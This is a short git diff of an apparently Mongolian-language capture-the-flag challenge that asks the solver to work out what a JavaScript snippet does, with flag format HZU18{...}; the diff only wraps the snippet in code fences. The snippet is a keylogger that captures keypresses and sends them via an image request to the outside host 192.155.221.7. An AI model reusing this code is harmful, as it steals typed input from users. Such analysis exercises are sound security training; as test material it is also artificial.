@@ -2,6 +2,7 @@
 
 Доор кодыг шинжилгээ хийн ямар үйлдэл хийж байгааг тодорхойл.
 
+```javascript
 <script LANGUAGE="JavaScript">
 document.captureEvents(Event.KEYPRESS);
 document.onkeypress = captureKeystrokes;
@@ -13,4 +14,6 @@ var src = "http://192.155.221.7/index.htm" +
 img.src = src;
 return true;}
 <script>| 
+
+```
 > Флаг формат: HZU18{Таны хариулт}
